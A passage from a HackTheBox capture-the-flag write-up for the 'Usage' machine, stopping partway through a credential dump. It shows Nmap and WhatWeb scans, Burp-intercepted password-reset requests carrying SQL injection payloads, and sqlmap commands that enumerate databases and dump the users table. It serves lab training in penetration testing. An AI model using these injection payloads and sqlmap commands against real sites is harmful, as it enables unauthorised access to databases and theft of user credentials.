<!doctype html><html lang=en><head><title>HTB Usage WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="HackThebox 'Usage' WriteUp"><meta name=keywords content="blog,pentesting,hacking,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB Usage WriteUp"><meta name=twitter:description content="HackThebox 'Usage' WriteUp"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/posts/usage/"><meta property="og:site_name" content="gunzf0x"><meta property="og:title" content="HTB Usage WriteUp"><meta property="og:description" content="HackThebox 'Usage' WriteUp"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-08-10T00:00:00+00:00"><meta property="article:modified_time" content="2024-08-10T00:00:00+00:00"><meta property="article:tag" content="HTB"><meta property="article:tag" content="Machine"><meta property="article:tag" content="Linux"><meta property="article:tag" content="Easy"><meta property="article:tag" content="Sqli"><meta property="article:tag" content="Burpsuite"><link rel=canonical href=https://gunzf0x.github.io/pentesting/posts/usage/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin=anonymous media=screen><link rel=icon type=image/svg+xml href=/images/favicon.svg sizes=any><link rel=icon type=image/png href=/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/projects/>Projects</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/contact/>Contact me</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/es/posts/usage/>üá®üá±</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/posts/usage/>HTB Usage WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-08-10T00:00:00Z>10 August, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
14-minute read</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/tags/htb/>HTB</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/machine/>Machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/linux/>Linux</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/easy/>Easy</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/sqli/>Sqli</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/burpsuite/>Burpsuite</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/nmap/>Nmap</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/whatweb/>Whatweb</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/laravel/>Laravel</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/php/>Php</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/linpeas/>Linpeas</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/brute-force-password-cracking/>Brute Force Password Cracking</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/john/>John</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/sudo/>Sudo</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/reverse-engineering/>Reverse Engineering</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/ghidra/>Ghidra</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/7z/>7z</a></span></div></div></header><div class=post-content><h1 id=usage----hackthebox>Usage &ndash; HackTheBox
<a class=heading-link href=#usage----hackthebox><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Linux</em></li><li>Difficulty: <em>Easy</em></li><li>Platform: <em>HackTheBox</em></li></ul><p><img alt="&lsquo;Usage&rsquo; Avatar" src=/images/Usage_avatar.png></p><hr><h2 id=summary>Summary
<a class=heading-link href=#summary><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p><code>Usage</code> is an easy <code>Linux</code> machine from <code>HackTheBox</code>. After an initial scan above <code>TCP</code> ports, they show the victim machine is running a website. This website presents a simple login panel, where we are able to create an account and find a new subdomain for the site. There is an option for our created user to restart our password; nevertheless, this function is vulnerable to <code>SQL Injection</code>. Thanks to this vulnerability, we are able to find the password for the admin panel in the previously found subdomain. Once inside this panel, we see that it is using a vulnerable <code>Laravel</code> version to <a href=https://nvd.nist.gov/vuln/detail/CVE-2023-24249 class=external-link target=_blank rel=noopener>CVE-2023-24249</a>. Thanks to this new vulnerability, we are able to gain access into the victim machine. Once inside, we are able to find credentials into some readable files and pivot to a new user. This new user can run a custom binary along with <code>sudo</code>. Using <code>Ghidra</code> we apply <code>Reverse engineering</code> over this binary and find it is running <code>7z</code> along with wildcard character (<code>*</code>). This allows us to read files owned by <code>root</code>, like its SSH key; which allows us to connect as root via <code>SSH</code> and complete the machine.</p><hr><h2 id=user>User
<a class=heading-link href=#user><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>We start with <code>Nmap</code> scanning for open <code>TCP</code> ports:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sS -p- --open --min-rate=5000 -n -Pn -vvv 10.10.11.18
</span></span></span></code></pre></div><ul><li><code>Nmap</code> scan shows only 2 ports open: <code>22</code> <code>SSH</code> and <code>80</code> <code>HTTP</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sVC -p22,80 10.10.11.18 -oN targeted
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-30 20:04 -04
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.10.11.18
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.19s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT   STATE SERVICE VERSION
</span></span></span><span class=line><span class=cl><span class=go>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
</span></span></span><span class=line><span class=cl><span class=go>| ssh-hostkey:
</span></span></span><span class=line><span class=cl><span class=go>|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
</span></span></span><span class=line><span class=cl><span class=go>|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
</span></span></span><span class=line><span class=cl><span class=go>80/tcp open  http    nginx 1.18.0 (Ubuntu)
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Did not follow redirect to http://usage.htb/
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: nginx/1.18.0 (Ubuntu)
</span></span></span><span class=line><span class=cl><span class=go>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 16.96 seconds
</span></span></span></code></pre></div><ul><li>From the scan I note that it is redirecting to <code>http://usage.htb</code>, so I add this domain to my <code>/etc/hosts</code> file running:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ echo &#39;10.10.11.18 usage.htb&#39; | sudo tee -a /etc/hosts
</span></span></span></code></pre></div><ul><li>Using <code>WhatWeb</code> on this site shows that the page is running on <code>Laravel</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ whatweb -a 3 http://usage.htb
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>http://usage.htb [200 OK] Bootstrap[4.1.3], Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[laravel_session], IP[10.10.11.18], Laravel, PasswordField[password], Title[Daily Blogs], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block], nginx[1.18.0]
</span></span></span></code></pre></div><ul><li>Visiting <code>http://usage.htb</code> from an internet browser shows a simple login panel:</li></ul><p><img alt="Usage 1" src=/images/Usage_1.png></p><ul><li>Since I don&rsquo;t have credentials I will create a simple account clicking at the top right on <code>Register</code>. This redirects us to <code>http://usage.htb/registration</code>. There we create a simple account:</li></ul><p><img alt="Usage 2" src=/images/Usage_2.png></p><ul><li>Log in the panel at <code>http://usage.htb</code> with the created account and we can see now the page:</li></ul><p><img alt="Usage 3" src=/images/Usage_3.png></p><p>but the site itself do not show anything interesting.</p><ul><li>I also note at the top right I can see an <code>Admin</code> that redirects to <code>admin.usage.htb</code>, so I add this new domain to my <code>/etc/hosts</code> file, so now this file looks like:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ tail -n 1 /etc/hosts
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>10.10.11.18 usage.htb admin.usage.htb
</span></span></span></code></pre></div><ul><li>Visiting <code>http://admin.usage.htb</code> shows another login panel:</li></ul><p><img alt="Usage 4" src=/images/Usage_4.png></p><p>but, again, I am not able to see something interesting.</p><ul><li>One last thing to check is the <code>Reset Password</code> button. It redirects to <code>http://usage.htb/forget-password</code>:</li></ul><p><img alt="Usage 5" src=/images/Usage_5.png></p><ul><li>I will put a random e-mail and intercept the request with <code>Burpsuite</code>. The request looks like:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/forget-password</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>usage.htb</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.5</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>69</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://usage.htb</span>
</span></span><span class=line><span class=cl><span class=n>DNT</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://usage.htb/forget-password</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>XSRF-TOKEN=eyJpdiI6IkU0OFBzSlVIZUtkNi9FMTdqYU1oTWc9PSIsInZhbHVlIjoiL21JRGJoNko0VXloTis3anNhN3o4QjEzVnM3VXpyZzR1eEp5dGNoNVFrbjl2ZnhZWW11MjJQNk14SGs1MmQ2ZXhVTExVRnNJSkRIaldCblpFTHNUZDE4VHBsU00rQmFVbGRFRUt2eGliMnpQc0ZaVTl1YTRDREdsYzk3elVJRm0iLCJtYWMiOiJiOGFlNzcxY2M0Yzg0N2QxMmNlMzE4MDNjYzgxM2NjN2JhODcxNzQ2MjMwNDZmMTIzYjJjYTRhY2MwZDBmYzY3IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IjdNSGFCZ2ZhZHAwZGhUVk1IV1hGblE9PSIsInZhbHVlIjoiR2pFTXBvTmJ1d1FSY3doVkxjTWwrMU8rWC9TbVhXREY1endLUFJmRjA2Sk51MHFKZ2RrTENHRXRyWDU1NFN3dzBmZ0pPSndGUzRGQVhWOUl4cFBvRkY4YTlFcGgyQmh3Tjc0aWxVdzFlamhkQnl2MVNqeStTNU5ZNG1mUGttSG0iLCJtYWMiOiI3N2E3MGEyYjhlMGMwODUxODcwOTM3NTBhYTVlMzliNWY1ZDQyZWU4NjUxZWE2YWU2NTU3ZWM1OTEyODg3MjVhIiwidGFnIjoiIn0%3D</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>_token=gOcHdqPJZFjMfEbgKpc027onHHcAX91A1bzez6Ay&amp;email=test%40test.com
</span></span></code></pre></div><ul><li>I send this to the <code>Repeater</code> and start playing with the parameters. Playing with <code>email</code> parameter gives us something. If I send the <code>SQL Injection</code> (<code>SQLi</code>) payload:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>ORDER</span><span class=w> </span><span class=k>BY</span><span class=w> </span><span class=mi>8</span><span class=c1>-- -
</span></span></span></code></pre></div><p>with <code>Burpsuite</code> in <code>email</code> parameter:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/forget-password</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>usage.htb</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.5</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>70</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://usage.htb</span>
</span></span><span class=line><span class=cl><span class=n>DNT</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://usage.htb/forget-password</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>XSRF-TOKEN=eyJpdiI6IkU0OFBzSlVIZUtkNi9FMTdqYU1oTWc9PSIsInZhbHVlIjoiL21JRGJoNko0VXloTis3anNhN3o4QjEzVnM3VXpyZzR1eEp5dGNoNVFrbjl2ZnhZWW11MjJQNk14SGs1MmQ2ZXhVTExVRnNJSkRIaldCblpFTHNUZDE4VHBsU00rQmFVbGRFRUt2eGliMnpQc0ZaVTl1YTRDREdsYzk3elVJRm0iLCJtYWMiOiJiOGFlNzcxY2M0Yzg0N2QxMmNlMzE4MDNjYzgxM2NjN2JhODcxNzQ2MjMwNDZmMTIzYjJjYTRhY2MwZDBmYzY3IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IjdNSGFCZ2ZhZHAwZGhUVk1IV1hGblE9PSIsInZhbHVlIjoiR2pFTXBvTmJ1d1FSY3doVkxjTWwrMU8rWC9TbVhXREY1endLUFJmRjA2Sk51MHFKZ2RrTENHRXRyWDU1NFN3dzBmZ0pPSndGUzRGQVhWOUl4cFBvRkY4YTlFcGgyQmh3Tjc0aWxVdzFlamhkQnl2MVNqeStTNU5ZNG1mUGttSG0iLCJtYWMiOiI3N2E3MGEyYjhlMGMwODUxODcwOTM3NTBhYTVlMzliNWY1ZDQyZWU4NjUxZWE2YWU2NTU3ZWM1OTEyODg3MjVhIiwidGFnIjoiIn0%3D</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>_token=gOcHdqPJZFjMfEbgKpc027onHHcAX91A1bzez6Ay&amp;email=&#39;+ORDER+BY+8--+-
</span></span></code></pre></div><p>this returns a code <code>302 Found</code>.
But if I change the payload to:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>ORDER</span><span class=w> </span><span class=k>BY</span><span class=w> </span><span class=mi>9</span><span class=c1>-- -
</span></span></span></code></pre></div><p>in <code>Burpsuite</code> with the request:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/forget-password</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>usage.htb</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.5</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>70</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://usage.htb</span>
</span></span><span class=line><span class=cl><span class=n>DNT</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://usage.htb/forget-password</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>XSRF-TOKEN=eyJpdiI6IkU0OFBzSlVIZUtkNi9FMTdqYU1oTWc9PSIsInZhbHVlIjoiL21JRGJoNko0VXloTis3anNhN3o4QjEzVnM3VXpyZzR1eEp5dGNoNVFrbjl2ZnhZWW11MjJQNk14SGs1MmQ2ZXhVTExVRnNJSkRIaldCblpFTHNUZDE4VHBsU00rQmFVbGRFRUt2eGliMnpQc0ZaVTl1YTRDREdsYzk3elVJRm0iLCJtYWMiOiJiOGFlNzcxY2M0Yzg0N2QxMmNlMzE4MDNjYzgxM2NjN2JhODcxNzQ2MjMwNDZmMTIzYjJjYTRhY2MwZDBmYzY3IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IjdNSGFCZ2ZhZHAwZGhUVk1IV1hGblE9PSIsInZhbHVlIjoiR2pFTXBvTmJ1d1FSY3doVkxjTWwrMU8rWC9TbVhXREY1endLUFJmRjA2Sk51MHFKZ2RrTENHRXRyWDU1NFN3dzBmZ0pPSndGUzRGQVhWOUl4cFBvRkY4YTlFcGgyQmh3Tjc0aWxVdzFlamhkQnl2MVNqeStTNU5ZNG1mUGttSG0iLCJtYWMiOiI3N2E3MGEyYjhlMGMwODUxODcwOTM3NTBhYTVlMzliNWY1ZDQyZWU4NjUxZWE2YWU2NTU3ZWM1OTEyODg3MjVhIiwidGFnIjoiIn0%3D</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>_token=gOcHdqPJZFjMfEbgKpc027onHHcAX91A1bzez6Ay&amp;email=&#39;+ORDER+BY+9--+-
</span></span></code></pre></div><p>we get code <code>500 Internal Server Error</code>.</p><p><img alt="Usage 6" src=/images/Usage_6.png></p><p>This might indicate a &ldquo;Boolean-based blind <code>SQLi</code>&rdquo;.</p><ul><li>So I will start using <code>SQLMap</code> since we have detected the injectable parameter. In <code>Burpsuite</code>, I will right click on the request (with the parameter <code>email=test@test.com</code>), and then select <code>Copy to file</code> option and save it as <code>request.req</code>. Then, start using <code>SQLMap</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sqlmap -r request.req --batch -p &#39;email&#39; --level 5 --risk 2 --technique=B
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>[21:43:06] [INFO] checking if the injection point on POST parameter &#39;email&#39; is a false positive
</span></span></span><span class=line><span class=cl><span class=go>POST parameter &#39;email&#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
</span></span></span><span class=line><span class=cl><span class=go>sqlmap identified the following injection point(s) with a total of 159 HTTP(s) requests:
</span></span></span><span class=line><span class=cl><span class=go>---
</span></span></span><span class=line><span class=cl><span class=go>Parameter: email (POST)
</span></span></span><span class=line><span class=cl><span class=go>    Type: boolean-based blind
</span></span></span><span class=line><span class=cl><span class=go>    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
</span></span></span><span class=line><span class=cl><span class=go>    Payload: _token=gOcHdqPJZFjMfEbgKpc027onHHcAX91A1bzez6Ay&amp;email=test@test.com&#39; AND 4290=(SELECT (CASE WHEN (4290=4290) THEN 4290 ELSE (SELECT 3154 UNION SELECT 6462) END))-- ENph
</span></span></span><span class=line><span class=cl><span class=go>---
</span></span></span><span class=line><span class=cl><span class=go>[21:43:28] [INFO] testing MySQL
</span></span></span><span class=line><span class=cl><span class=go>[21:43:30] [INFO] confirming MySQL
</span></span></span><span class=line><span class=cl><span class=go>[21:43:33] [INFO] the back-end DBMS is MySQL
</span></span></span><span class=line><span class=cl><span class=go>web server operating system: Linux Ubuntu
</span></span></span><span class=line><span class=cl><span class=go>web application technology: Nginx 1.18.0
</span></span></span><span class=line><span class=cl><span class=go>back-end DBMS: MySQL &gt;= 8.0.0
</span></span></span><span class=line><span class=cl><span class=go>[21:43:34] [WARNING] HTTP error codes detected during run:
</span></span></span><span class=line><span class=cl><span class=go>500 (Internal Server Error) - 76 times
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>where <code>--technique=B</code> specifies the technique &ldquo;Boolean-based blind&rdquo; injection (and save us a lot of time) as we have found.</p><ul><li>Then extract databases with <code>--dbs</code> flag:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sqlmap -r request.req --batch --dbs --threads 10
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>[21:48:56] [INFO] retrieved: information_schema
</span></span></span><span class=line><span class=cl><span class=go>[21:48:56] [INFO] retrieving the length of query output
</span></span></span><span class=line><span class=cl><span class=go>[21:48:56] [INFO] retrieved: 18
</span></span></span><span class=line><span class=cl><span class=go>[21:49:19] [INFO] retrieved: performance_schema
</span></span></span><span class=line><span class=cl><span class=go>[21:49:19] [INFO] retrieving the length of query output
</span></span></span><span class=line><span class=cl><span class=go>[21:49:19] [INFO] retrieved: 10
</span></span></span><span class=line><span class=cl><span class=go>[21:49:36] [INFO] retrieved: usage_blog
</span></span></span><span class=line><span class=cl><span class=go>available databases [3]:
</span></span></span><span class=line><span class=cl><span class=go>[*] information_schema
</span></span></span><span class=line><span class=cl><span class=go>[*] performance_schema
</span></span></span><span class=line><span class=cl><span class=go>[*] usage_blog
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><ul><li><code>usage_blog</code> database seems interesting. Check its tables using <code>--tables</code> flag and selecting it with <code>-D</code> flag:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sqlmap -r request.req --batch -D usage_blog --tables --threads 10
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>Database: usage_blog
</span></span></span><span class=line><span class=cl><span class=go>[15 tables]
</span></span></span><span class=line><span class=cl><span class=go>+------------------------+
</span></span></span><span class=line><span class=cl><span class=go>| admin_menu             |
</span></span></span><span class=line><span class=cl><span class=go>| admin_operation_log    |
</span></span></span><span class=line><span class=cl><span class=go>| admin_permissions      |
</span></span></span><span class=line><span class=cl><span class=go>| admin_role_menu        |
</span></span></span><span class=line><span class=cl><span class=go>| admin_role_permissions |
</span></span></span><span class=line><span class=cl><span class=go>| admin_role_users       |
</span></span></span><span class=line><span class=cl><span class=go>| admin_roles            |
</span></span></span><span class=line><span class=cl><span class=go>| admin_user_permissions |
</span></span></span><span class=line><span class=cl><span class=go>| admin_users            |
</span></span></span><span class=line><span class=cl><span class=go>| blog                   |
</span></span></span><span class=line><span class=cl><span class=go>| failed_jobs            |
</span></span></span><span class=line><span class=cl><span class=go>| migrations             |
</span></span></span><span class=line><span class=cl><span class=go>| password_reset_tokens  |
</span></span></span><span class=line><span class=cl><span class=go>| personal_access_tokens |
</span></span></span><span class=line><span class=cl><span class=go>| users                  |
</span></span></span><span class=line><span class=cl><span class=go>+------------------------+
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><ul><li>Now, we can use <code>-T</code> to select a table, <code>-C</code> to select the columns we are interested in, and <code>--dump</code> to extract the info on them. First, I decide to check <code>users</code> table. I extract the credentials from the user I have just created and get some other users:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sqlmap -r request.req --batch -D usage_blog -T users -C name,email,password --dump --threads 10
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>Database: usage_blog
</span></span></span><span class=line><span class=cl><span class=go>Table: users
</span></span></span><span class=line><span class=cl><span class=go>[3 entries]
</span></span></span><span class=line><span class=cl><span class=go>+---------+---------------------+--------------------------------------------------------------+
</span></span></span><span class=line><span class=cl><span class=go>| name    | email               | password                                                     |
</span></span></span><span class=line><span class=cl><span class=go>+---------+---------------------+--------------------------------------------------------------+
